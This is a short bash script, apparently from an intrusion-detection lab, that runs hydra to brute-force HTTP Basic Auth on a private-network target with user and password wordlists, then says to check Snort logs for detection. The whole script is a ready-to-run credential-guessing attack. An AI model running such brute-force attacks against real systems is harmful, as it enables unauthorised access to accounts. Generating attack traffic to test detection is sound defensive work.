#!/bin/bash

TARGET_IP=${TARGET_IP:-192.168.100.10}
TARGET_PORT=80

echo "HTTP Basic Auth Brute Force Attack"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Starting attack..."

# Ataque HTTP Basic Auth
hydra -L /opt/attacks/wordlists/users.txt \
      -P /opt/attacks/wordlists/passwords.txt \
      -t 4 -vV -f \
      http-get://$TARGET_IP:$TARGET_PORT/

echo "HTTP attack completed. Check Snort logs for detection."